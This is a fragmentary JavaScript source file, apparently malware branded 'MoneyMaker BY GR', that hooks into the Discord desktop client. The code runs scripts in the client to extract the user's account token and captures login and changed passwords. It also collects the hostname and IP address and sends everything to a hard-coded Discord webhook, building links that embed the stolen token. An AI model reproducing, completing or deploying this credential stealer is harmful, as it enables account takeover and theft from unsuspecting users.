...
const os = require('os')
var webhook = "https://discord.com/api/webhooks/932612737907974164/Jf6RdmeX-395b4xweV1iwbCbIxSJSnvH4i1bY65V4bO0a592gH5h9Lr1AI8iAnZnfxtI";
...
function FirstTime() {
	...
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
				...
				if (token == null || token == undefined || token == "") {
					var c = {
						...
						embeds: [{
							...
							author: {
								name: "MoneyMaker BY GR"
							},
							footer: {
								text: "MoneyMaker BY GR"
							}
						}]
					};
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							embeds: [{
								...
								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.MoneyMaker BY GR.to/raw/"+ token +")",
								color: config["embed-color"],
								fields: [{
									name: "Info",
									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
		...
		if (!fs.existsSync(path.join(__dirname, "MoneyMaker BY GRBTW"))) {
			return !0
		}
		fs.rmdirSync(path.join(__dirname, "MoneyMaker BY GRBTW"));
        ...
        xmlHttp.responseText`, !0).then((info3) => {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var fieldo = [];
							var baseuri = "https://premium.MoneyMaker BY GR.to/raw/"
							...
							var params = {
								...
								embeds: [{
									"title": "User Login",
									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.MoneyMaker BY GR.to/raw/"+ token +"<br>"+ password+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								embeds: [{
									...
									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.MoneyMaker BY GR.to/raw/"+ token +"<br>"+ newpassword+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
